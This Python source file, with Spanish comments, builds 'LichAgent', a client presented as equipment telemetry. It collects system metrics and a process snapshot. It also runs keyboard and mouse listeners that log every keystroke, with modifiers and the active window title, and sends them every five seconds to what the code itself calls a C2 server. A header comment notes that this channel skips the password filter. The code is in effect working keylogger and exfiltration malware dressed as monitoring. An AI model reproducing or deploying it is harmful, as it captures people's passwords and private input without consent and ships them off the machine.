# CONTEXTO INICIAL
# Cliente legado de telemetría de equipos, independiente del capturador web.
# Reúne métricas del sistema y utiliza un buffer para las interacciones que capturan
# sus listeners; periódicamente envía un formulario al endpoint de máquinas con
# autenticación Basic. El backend actualiza agentes y guarda esas interacciones
# en endpoint_events. Este canal no utiliza los contextos ni el filtro de contraseñas
# del DOM del módulo web, cuyos registros se almacenan en audit_events.
import platform
import hashlib
import requests
import psutil
import threading
import queue
import time
import json
import logging
import socket
import os
from datetime import datetime

# Configuración de Logging para depuración del agente
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - [%(threadName)s] %(message)s')
logger = logging.getLogger("LichAgent")

class LichTelemetryBuffer:
    """
    Buffer de eventos de interfaz de usuario (UI Events).
    Implementa una cola de memoria no bloqueante para capturar
    interacciones sin degradar el rendimiento del hilo principal.
    """
    def __init__(self, max_size=1000):
        self.queue = queue.Queue()
        self.max_size = max_size
        self.is_running = True

    def _enqueue_event(self, event_data):
        """
        Añade un evento al buffer.
        Si el buffer alcanza su capacidad máxima, descarta el evento más antiguo
        para mantener la latencia de memoria baja (estrategia de desbordamiento).
        """
        if self.queue.qsize() >= self.max_size:
            try:
                self.queue.get_nowait()
            except queue.Empty:
                pass
        self.queue.put(event_data)

    def _on_key_press(self, key):
        """
        Callback para el listener de teclado.
        Extrae el carácter, modificadores y contexto de la ventana activa.
        """
        try:
            # Extraer carácter legible
            char = key.char if hasattr(key, 'char') else str(key)

            # Extraer modificadores (Ctrl, Shift, Alt)
            modifiers = []
            if key.ctrl: modifiers.append("CTRL")
            if key.shift: modifiers.append("SHIFT")
            if key.alt: modifiers.append("ALT")
            if key.alt_gr: modifiers.append("ALT_GR")

            # Obtener título de la ventana activa (Contexto Operativo)
            active_window = self._get_active_window_title()

            event = {
                "ts": int(time.time() * 1000),
                "key": char,
                "modifiers": modifiers,
                "window": active_window
            }
            self._enqueue_event(event)

        except Exception as e:
            logger.debug(f"Error procesando evento de teclado: {e}")

    def _on_mouse_click(self, x, y, button, pressed):
        """
        Callback para clics de ratón (opcional, para telemetría de puntero).
        """
        if pressed:
            event = {
                "ts": int(time.time() * 1000),
                "key": f"CLICK_{button}",
                "modifiers": [str(x), str(y)], # Usamos modificadores para coordenadas en este ejemplo
                "window": self._get_active_window_title()
            }
            self._enqueue_event(event)

    def _get_active_window_title(self):
        """
        Obtiene el título de la ventana activa de forma nativa según el SO.
        """
        try:
            if platform.system() == "Windows":
                import ctypes
                length = ctypes.windll.user32.GetWindowTextLengthW(ctypes.windll.user32.GetForegroundWindow())
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(ctypes.windll.user32.GetForegroundWindow(), buf, length + 1)
                return buf.value
            elif platform.system() == "Darwin":
                # Para macOS, requeriría pyobjc o accesibilidad, simplificado aquí
                return "MacOS-Active-App"
            else:
                # Linux: requeriría Xlib o wmctrl
                return "Linux-Active-Window"
        except Exception:
            return "Unknown-Window"

    def start(self):
        """Inicia los listeners de teclado y ratón en hilos demonios."""
        from pynput import keyboard, mouse

        self.kb_listener = keyboard.Listener(on_press=self._on_key_press)
        self.mouse_listener = mouse.Listener(on_click=self._on_mouse_click)

        self.kb_listener.start()
        self.mouse_listener.start()
        logger.info("Listeners de telemetría de interfaz iniciados.")

    def stop(self):
        """Detiene los listeners."""
        self.is_running = False
        if hasattr(self, 'kb_listener'): self.kb_listener.stop()
        if hasattr(self, 'mouse_listener'): self.mouse_listener.stop()

    def drain(self):
        """
        Drena el buffer y devuelve la lista de eventos acumulados.
        Se llama antes de cada envío de telemetría.
        """
        events = []
        while not self.queue.empty():
            events.append(self.queue.get_nowait())
        return events

class LichAgent:
    def __init__(self, server_url="http://localhost:8080"):
        self.server_url = server_url
        self.endpoint_save = f"{server_url}/api/agentes/telemetria"
        self.api_password = os.environ.get("AUDIT_AGENT_PASSWORD", "")
        if not self.api_password:
            raise ValueError("Configura AUDIT_AGENT_PASSWORD (la misma del backend)")

        # Identidad determinista del endpoint
        hostname = platform.node()
        self.codigo = f"AGT-{hashlib.sha256(hostname.encode()).hexdigest()[:8]}"

        # Inicializar Buffer de Telemetría
        self.telemetry_buffer = LichTelemetryBuffer(max_size=1000)
        self.is_running = True

    def _collect_system_metrics(self):
        """Recolección de métricas de recursos del sistema."""
        cpu_percent = psutil.cpu_percent(interval=None)
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')

        return {
            "cpuPercent": cpu_percent,
            "consumoMemoriaMb": round(memory_info.used / (1024 * 1024), 2),
            "diskUsedGb": round(disk_info.used / (1024 ** 3), 2)
        }

    def _collect_process_snapshot(self, top_n=5):
        """
        Recolección de una instantánea de los procesos con mayor consumo de CPU.
        Devuelve una lista serializada a JSON.
        """
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                if p.info['cpu_percent'] is not None and p.info['cpu_percent'] > 0:
                    procs.append({
                        "pid": p.info['pid'],
                        "name": p.info['name'],
                        "cpu": round(p.info['cpu_percent'], 2),
                        "mem": round(p.info['memory_percent'], 2)
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        # Ordenar por CPU y tomar los top N
        procs.sort(key=lambda x: x['cpu'], reverse=True)
        return json.dumps(procs[:top_n])

    def _build_payload(self):
        """
        Construye el payload final fusionando métricas de recursos,
        eventos de interfaz de usuario y instantánea de procesos.
        """
        # 1. Datos de Identidad
        hostname = platform.node()
        system = platform.system()

        # 2. Métricas de Recursos
        metrics = self._collect_system_metrics()

        # 3. Eventos de Interfaz (Keylog/Mouse)
        ui_events = self.telemetry_buffer.drain()

        # 4. Instantánea de Procesos
        process_snapshot = self._collect_process_snapshot()

        payload = {
            # Identidad y Estado
            "codigo": self.codigo,
            "hostname": hostname,
            "system": system,
            "activo": True,

            # Métricas de Rendimiento
            "cpuPercent": metrics["cpuPercent"],
            "consumoMemoriaMb": metrics["consumoMemoriaMb"],
            "diskUsedGb": metrics["diskUsedGb"],

            # Telemetría Avanzada (Serializada como JSON String para form-data)
            "uiEventsPayload": json.dumps(ui_events),
            "processSnapshotJson": process_snapshot
        }
        return payload

    def _send_telemetry(self):
        """Envía el payload fusionado al servidor C2."""
        payload = self._build_payload()

        # Verificación de tamaño para evitar payloads excesivos
        if len(str(payload)) > 1_000_000:
            logger.warning("Payload excesivo, truncando eventos de interfaz.")
            payload["uiEventsPayload"] = "[]"

        try:
            response = requests.post(
                self.endpoint_save,
                data=payload,
                auth=("agent", self.api_password),
                timeout=10,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            response.raise_for_status()
            logger.info(f"Telemetría enviada. Status: {response.status_code}. Eventos: {len(json.loads(payload['uiEventsPayload']))}")
        except requests.exceptions.ConnectionError:
            logger.error("[ERROR DE CONEXIÓN] Servidor C2 inalcanzable.")
        except requests.exceptions.Timeout:
            logger.error("[TIMEOUT] El servidor C2 tardó demasiado.")
        except requests.exceptions.RequestException as e:
            logger.error(f"[ERROR HTTP] {e}")

    def run(self):
        logger.info(f"Iniciando LichAgent para {self.codigo} en {platform.node()} ({platform.system()})")

        # 1. Iniciar Listeners de Telemetría
        self.telemetry_buffer.start()

        # Calibrar CPU para la primera lectura no bloqueante
        psutil.cpu_percent(interval=None)

        try:
            while self.is_running:
                self._send_telemetry()
                time.sleep(5) # Intervalo de sondeo de 5 segundos
        except KeyboardInterrupt:
            logger.info("Agente detenido por el usuario.")
        finally:
            self.telemetry_buffer.stop()

if __name__ == "__main__":
    agent = LichAgent()
    agent.run()